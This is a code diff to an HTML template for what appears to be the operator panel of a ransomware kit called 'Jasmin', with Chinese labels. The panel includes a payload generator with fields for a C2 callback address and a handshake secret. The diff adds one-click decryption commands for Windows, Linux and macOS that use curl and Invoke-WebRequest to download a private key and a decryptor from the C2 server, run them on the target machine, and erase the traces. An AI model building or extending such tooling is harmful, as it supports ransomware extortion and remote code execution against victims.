@@ -30,7 +30,7 @@
 <section class="panel" id="panel-gen">
 <h2><i class="fas fa-virus"></i> 载荷生成器</h2>
 <div class="gen-opts" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:20px">
-  <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="http://127.0.0.1:5000/handshake"></div>
+  <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="{{ request.url_root }}handshake"></div>
   <div class="field"><label>握手密钥</label><input type="text" id="gensecret" value="jasmin@123"></div>
   <div class="field"><label>目标系统</label>
     <select id="gen-platform" style="width:100%;padding:9px 12px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.85rem">
@@ -108,29 +108,39 @@
   <button class="dt-btn" onclick="showDT('mac')"><i class="fab fa-apple"></i> macOS</button>
 </div>
 <div class="dt-content" id="dt-win">
-<h3>Windows 解密</h3>
-<p class="dt-desc">使用 Jasmin Decryptor (WinForms GUI)</p>
-<div class="dt-step"><span>1</span>准备 RSA 私钥 <code>jasmin_private.pem</code></div>
-<div class="dt-step"><span>2</span>运行 <code>Jasmin Decryptor.exe</code></div>
-<div class="dt-step"><span>3</span>选择 <code>.pem</code> 私钥文件</div>
-<div class="dt-step"><span>4</span>自动扫描验证 → 点击 Decrypt</div>
-<div class="dt-note"><i class="fas fa-shield-alt"></i> SHA256 校验确保完整还原</div>
+<h3>🖥️ Windows 一键解密</h3>
+<div class="dt-step"><span>1</span>在目标机打开 PowerShell (管理员)</div>
+<div class="dt-step"><span>2</span>复制下方命令直接运行</div>
+<div class="dt-note"><i class="fas fa-shield-alt"></i> 自动下载私钥+解密器、执行解密、清理临时文件</div>
+<pre class="dt-code">$tmp="$env:TEMP\jasmin_dec"
+New-Item -ItemType Directory -Force -Path $tmp | Out-Null
+Invoke-WebRequest "{{ request.url_root }}payloads/jasmin_private.pem" -OutFile "$tmp\key.pem"
+Invoke-WebRequest "{{ request.url_root }}payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
+& "$tmp\dec.exe" "$tmp\key.pem"
+Remove-Item -Recurse -Force $tmp</pre>
 </div>
 <div class="dt-content" id="dt-linux" style="display:none">
-<h3>Linux 解密</h3>
-<pre class="dt-code">pip3 install cryptography
-python3 jasmin_decrypt.py jasmin_private.pem</pre>
-<div class="dt-step"><span>1</span>上传私钥 + 脚本到目标</div>
-<div class="dt-step"><span>2</span>运行解密，自动扫描 /home /root /var</div>
-<div class="dt-step"><span>3</span>指定目录: <code>python3 jasmin_decrypt.py key.pem /path</code></div>
+<h3>🐧 Linux 一键解密</h3>
+<div class="dt-step"><span>1</span>在目标机打开终端</div>
+<div class="dt-step"><span>2</span>复制下方命令直接运行</div>
+<div class="dt-note"><i class="fas fa-shield-alt"></i> 自动安装依赖、下载私钥和脚本、全盘解密、清理</div>
+<pre class="dt-code">pip3 install -q cryptography 2>/dev/null
+curl -sL {{ request.url_root }}payloads/jasmin_private.pem -o /tmp/.jk
+curl -sL {{ request.url_root }}payloads/jasmin_decrypt.py -o /tmp/.jd
+python3 /tmp/.jd /tmp/.jk
+rm -f /tmp/.jk /tmp/.jd</pre>
 </div>
 <div class="dt-content" id="dt-mac" style="display:none">
-<h3>macOS 解密</h3>
-<pre class="dt-code">pip3 install cryptography
-python3 jasmin_decrypt.py jasmin_private.pem</pre>
-<div class="dt-step"><span>1</span>与 Linux 相同流程</div>
-<div class="dt-step"><span>2</span>自动扫描 ~/、/Users、/tmp</div>
+<h3>🍎 macOS 一键解密</h3>
+<div class="dt-step"><span>1</span>打开终端</div>
+<div class="dt-step"><span>2</span>复制下方命令直接运行</div>
+<pre class="dt-code">pip3 install -q cryptography 2>/dev/null
+curl -sL {{ request.url_root }}payloads/jasmin_private.pem -o /tmp/.jk
+curl -sL {{ request.url_root }}payloads/jasmin_decrypt.py -o /tmp/.jd
+python3 /tmp/.jd /tmp/.jk
+rm -f /tmp/.jk /tmp/.jd</pre>
 </div>
+<div class="dt-note" style="margin-top:20px"><i class="fas fa-info-circle"></i> <b>准备:</b> 请先将 <code>jasmin_private.pem</code> 和 <code>jasmin_decrypt.py</code> 上传到 payloads/ 目录</div>
 </section>
 
 </main>
